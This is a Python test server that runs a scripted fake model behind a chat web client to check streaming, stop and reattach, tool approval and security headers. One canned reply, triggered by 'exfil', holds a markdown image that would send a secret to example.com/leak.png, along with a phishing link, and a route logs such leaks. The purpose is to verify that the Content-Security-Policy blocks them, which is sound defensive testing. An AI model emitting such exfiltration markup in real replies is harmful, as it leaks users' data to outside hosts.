"""Step 10 spike: the detached turn from step 8 behind a real useChat client. No real LLM. Run: python server.py <dist dir> <sdk major>."""
import asyncio
import json
import sys
import time
import uuid
import warnings
from pathlib import Path

import uvicorn
from pydantic_ai import Agent, ApprovalRequired, CancellationToken, DeferredToolRequests, RunContext, capture_run_messages
from pydantic_ai.exceptions import ModelAPIError
from pydantic_ai.messages import ModelMessagesTypeAdapter, ModelRequest, ModelResponse, TextPart, ToolReturn, ToolReturnPart, UserPromptPart
from pydantic_ai.models.function import DeltaToolCall, FunctionModel
from pydantic_ai.ui.vercel_ai import VercelAIAdapter
from pydantic_ai.ui.vercel_ai.response_types import DataChunk
from starlette.applications import Starlette
from starlette.middleware import Middleware
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import FileResponse, JSONResponse, Response, StreamingResponse
from starlette.routing import Route

warnings.filterwarnings("ignore")
DIST = Path(sys.argv[1])
SDK = int(sys.argv[2])
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 18800
CSP = sys.argv[4] if len(sys.argv) > 4 else "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' blob: data:; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
threads: dict = {}
runs: dict = {}
log: list = []


def latest_user_text(messages):
    for m in reversed(messages):
        if isinstance(m, ModelRequest):
            for p in m.parts:
                if isinstance(p, UserPromptPart) and isinstance(p.content, str):
                    return p.content
    return ""


def has_return(messages):
    tail = messages[-1]
    return isinstance(tail, ModelRequest) and any(isinstance(p, ToolReturnPart) for p in tail.parts)


async def stream(messages, info):
    text = latest_user_text(messages).lower()
    if "slow" in text:
        for i in range(40):
            await asyncio.sleep(0.15)
            yield f"w{i} "
    elif "remember" in text and not has_return(messages):
        yield {0: DeltaToolCall(name="preference", json_args='{"text": "rent is fixed"}', tool_call_id=f"c{uuid.uuid4().hex[:8]}")}
    elif "log" in text and not has_return(messages):
        yield {0: DeltaToolCall(name="record_movement", json_args='{"amount_rupees": 450}', tool_call_id=f"c{uuid.uuid4().hex[:8]}")}
    elif "exfil" in text:
        yield "Here: ![x](https://example.com/leak.png?d=SECRET) and [a link](https://example.com/phish) and **bold** and `code`."
    elif "die" in text:
        yield "partial "
        raise ModelAPIError("m", "db down at 10.0.0.5:5432")
    elif has_return(messages):
        yield "Done. Your balance is ₹1,24,873."
    else:
        yield "Hello ₹450."


agent = Agent(FunctionModel(stream_function=stream), output_type=[str, DeferredToolRequests])


@agent.tool
async def preference(ctx: RunContext, text: str) -> str:
    """A lasting write, always gated in this spike."""
    if not ctx.tool_call_approved:
        raise ApprovalRequired()
    log.append(("preference", ctx.tool_call_id))
    return "remembered"


@agent.tool
async def record_movement(ctx: RunContext, amount_rupees: int) -> ToolReturn:
    """An everyday write, with a card."""
    log.append(("record_movement", ctx.tool_call_id))
    return ToolReturn(return_value="saved", metadata=[DataChunk(type="data-card", data={"kind": "undo", "undo_id": "u1", "summary": f"₹{amount_rupees} logged"})])


class Turn:
    def __init__(self, thread_id, message_id, ui_message):
        self.thread_id, self.message_id, self.ui_message = thread_id, message_id, ui_message
        self.chunks, self.done, self.wake, self.token = [], False, asyncio.Event(), CancellationToken()
        self.ending = None
        self.first_chunk_ms = None
        self.started = time.perf_counter()

    def push(self, chunk):
        if self.first_chunk_ms is None and "text-delta" in chunk:
            self.first_chunk_ms = round((time.perf_counter() - self.started) * 1000, 1)
        self.chunks.append(chunk)
        self.wake.set()

    async def read(self):
        i = 0
        while True:
            while i < len(self.chunks):
                yield self.chunks[i]
                i += 1
            if self.done:
                return
            self.wake.clear()
            await self.wake.wait()


def save(thread, messages, ending):
    thread["history"] = json.loads(ModelMessagesTypeAdapter.dump_json(messages))
    thread["last_ending"] = ending


async def chat(request):
    body = await request.body()
    payload = json.loads(body)
    thread_id = payload.get("id") or uuid.uuid4().hex
    thread = threads.setdefault(thread_id, {"history": None, "seen": {}, "last_ending": None})
    last = (payload.get("messages") or [{}])[-1]
    message_id = last.get("id")
    log.append(("post", message_id, last.get("role"), [p.get("type") for p in last.get("parts", [])][:4], [p.get("state") for p in last.get("parts", []) if p.get("state")]))

    # A message ID starts one turn, ever, unless it's an approval answer on the assistant's message.
    current = runs.get(thread_id)
    if current and not current.done and current.message_id == message_id:
        return StreamingResponse(current.read(), media_type="text/event-stream", headers={"x-vercel-ai-ui-message-stream": "v1"})
    if last.get("role") == "user" and message_id in thread["seen"]:
        return JSONResponse({"type": "about:blank", "title": "already answered", "status": 409}, status_code=409, media_type="application/problem+json")

    if current and not current.done:
        await current.task  # one running turn per thread: a new message waits
    if last.get("role") == "user":
        thread["seen"][message_id] = True

    turn = Turn(thread_id, message_id, last)
    runs[thread_id] = turn
    history = ModelMessagesTypeAdapter.validate_python(thread["history"]) if thread["history"] else []
    adapter = await VercelAIAdapter.from_request(request, agent=agent, sdk_version=SDK, manage_message_history="server", allowed_file_url_schemes=frozenset())

    async def done(result):
        turn.ending = "finished"
        save(thread, result.all_messages(), "finished")

    async def cancelled(exc):
        turn.ending = "stopped"
        save(thread, exc.all_messages(), "stopped")

    async def plain_errors(events):
        async for ev in events:
            if type(ev).__name__ == "ErrorChunk":
                log.append(("real error", ev.error_text))
                ev = type(ev)(error_text="The model failed. Your message is saved; try again.")
            yield ev

    async def go():
        try:
            with capture_run_messages() as captured:
                stream_ = adapter.run_stream(message_history=history, conversation_id=thread_id, cancellation_token=turn.token, on_complete=done, on_cancel=cancelled)
                async for chunk in adapter.encode_stream(plain_errors(stream_)):
                    turn.push(chunk)
            if turn.ending is None:
                turn.ending = "failed"
                save(thread, list(captured), "failed")
        finally:
            turn.done = True
            turn.wake.set()

    turn.task = asyncio.create_task(go())
    return StreamingResponse(turn.read(), media_type="text/event-stream", headers={"x-vercel-ai-ui-message-stream": "v1", "cache-control": "no-cache"})


async def reattach(request):
    turn = runs.get(request.path_params["thread"])
    log.append(("reattach", bool(turn and not turn.done)))
    if not turn or turn.done:
        return Response(status_code=204)
    return StreamingResponse(turn.read(), media_type="text/event-stream", headers={"x-vercel-ai-ui-message-stream": "v1", "cache-control": "no-cache"})


async def stop(request):
    turn = runs.get(request.path_params["thread"])
    if turn and not turn.done:
        turn.token.cancel()
    log.append(("stop", bool(turn)))
    return Response(status_code=204)


async def messages(request):
    """What the app loads on open: the saved thread, as UI messages, plus a running turn's message."""
    thread_id = request.path_params["thread"]
    thread = threads.get(thread_id)
    out = []
    if thread and thread["history"]:
        out = VercelAIAdapter.dump_messages(ModelMessagesTypeAdapter.validate_python(thread["history"]), sdk_version=SDK) if "sdk_version" in VercelAIAdapter.dump_messages.__code__.co_varnames else VercelAIAdapter.dump_messages(ModelMessagesTypeAdapter.validate_python(thread["history"]))
        out = [m.model_dump(mode="json", by_alias=True, exclude_none=True) for m in out]
    turn = runs.get(thread_id)
    running = bool(turn and not turn.done)
    if running and turn.ui_message.get("role") == "user":
        out.append(turn.ui_message)
    return JSONResponse({"messages": out, "running": running, "last_ending": thread and thread["last_ending"]})


async def debug(request):
    t = runs.get(request.path_params["thread"]) if "thread" in request.path_params else None
    return JSONResponse({"log": [list(x) for x in log[-25:]], "first_chunk_ms": t.first_chunk_ms if t else None, "ending": t.ending if t else None})


async def csp_report(request):
    log.append(("csp", (await request.body()).decode()[:200]))
    return Response(status_code=204)


async def leak(request):
    log.append(("leak", str(request.url)))
    return Response(status_code=204)


async def static(request):
    path = request.path_params.get("path", "")
    file = (DIST / path).resolve()
    if path and file.is_file() and DIST.resolve() in file.parents:
        return FileResponse(file)
    html = DIST / path / "index.html"
    return FileResponse(html if html.is_file() else DIST / "index.html")


class Headers(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["content-security-policy"] = CSP
        response.headers["x-content-type-options"] = "nosniff"
        response.headers["referrer-policy"] = "no-referrer"
        return response


app = Starlette(
    routes=[
        Route("/api/chat", chat, methods=["POST"]),
        Route("/api/chat/{thread}/stream", reattach),
        Route("/api/chat/{thread}/stop", stop, methods=["POST"]),
        Route("/api/chat/{thread}/messages", messages),
        Route("/api/debug/{thread}", debug),
        Route("/api/debug", debug),
        Route("/leak.png", leak),
        Route("/{path:path}", static),
    ],
    middleware=[Middleware(Headers)],
)
uvicorn.run(app, host="127.0.0.1", port=PORT, log_level="warning")
